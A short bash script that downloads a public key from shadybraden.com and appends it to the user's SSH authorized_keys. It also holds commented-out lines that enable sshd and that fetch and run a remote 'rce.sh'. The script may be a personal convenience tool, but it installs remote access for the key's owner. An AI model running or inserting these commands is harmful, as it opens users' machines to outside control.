#!/bin/bash

# install ssh on fedora
# sudo dnf install -y openssh-server && sudo systemctl enable --now sshd

# curl https://shadybraden.com/rce.sh -o rce.sh && chmod +x rce.sh && ./rce.sh

# download my public key
curl https://shadybraden.com/public.key -o public.key

# append my public key to your authorized_keys
cat public.key >> ~/.ssh/authorized_keys
